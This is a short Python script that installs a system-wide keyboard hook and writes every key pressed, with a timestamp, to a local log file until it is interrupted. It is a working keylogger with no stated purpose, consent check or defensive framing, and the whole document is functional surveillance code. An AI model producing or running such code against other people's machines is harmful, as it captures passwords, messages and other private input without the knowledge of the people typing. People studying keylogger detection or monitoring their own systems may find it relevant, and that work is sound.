import datetime
import keyboard

# Path to the log file to store keystrokes
log_file = "keystroke_log.txt"

def on_press(event):
    # Write keystroke to log file
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f"{timestamp}: {event.name}\n")

try:
    # Start the listener for key press events
    keyboard.on_press(on_press)

    # Keep the program running
    keyboard.wait()
    
except KeyboardInterrupt:
    print("KeyboardInterrupt: Exiting program")
